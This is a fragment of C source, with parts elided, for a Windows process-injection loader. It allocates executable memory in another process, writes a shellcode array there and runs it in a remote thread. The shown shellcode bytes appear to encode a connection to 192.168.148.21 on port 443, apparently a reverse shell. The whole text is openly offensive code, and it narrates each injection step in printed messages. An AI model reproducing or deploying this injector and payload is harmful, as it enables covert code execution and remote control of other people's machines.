...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x94\x15\x41\x54"
...
int main(int argc, char* argv[]) {
	...
	printf("%s got a handle to a process!\n\\---0x%p\n", k, hProcess);
	...
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(evilShit), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(evilShit));

	WriteProcessMemory(hProcess, rBuffer, evilShit, sizeof(evilShit), NULL);
	printf("%s is wrote to %zu-bytes to process memory\n", k, sizeof(evilShit));
	...
	if (hThread == NULL) {
		printf("%s failed to get hadnle to a thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to a thread (%ld)\n\\---0x%p\n", k, TID, hThread);

	printf("%s waiting for thread to finish\n", k);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finised executing\n", k);
